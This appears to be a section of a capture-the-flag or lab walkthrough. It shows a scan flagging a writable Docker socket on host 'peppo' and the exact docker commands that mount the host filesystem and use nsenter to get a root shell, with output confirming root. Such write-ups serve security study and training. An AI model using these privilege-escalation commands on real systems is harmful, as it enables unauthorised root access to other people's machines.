# 8 privesc docker socket > root

```
╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
Docker socket /var/run/docker.sock is writable (https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket)

# check for existing images
eleanor@peppo:~/k$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        15 months ago       542MB
postgres            latest              adf2b126dda8        15 months ago       313MB

Using https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket

eleanor@peppo:~/k$ docker -H unix:///var/run/docker.sock run -v /:/host -it postgres chroot /host /bin/bash
root@9bbff4e0902a:/# exit

eleanor@peppo:~/k$ docker -H unix:///var/run/docker.sock run -it --privileged --pid=host postgres nsenter -t 1 -m -u -n -i bash
root@peppo:/# whoami;id;hostname;uname -a
root
uid=0(root) gid=0(root) groups=0(root)
peppo
Linux peppo 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
```
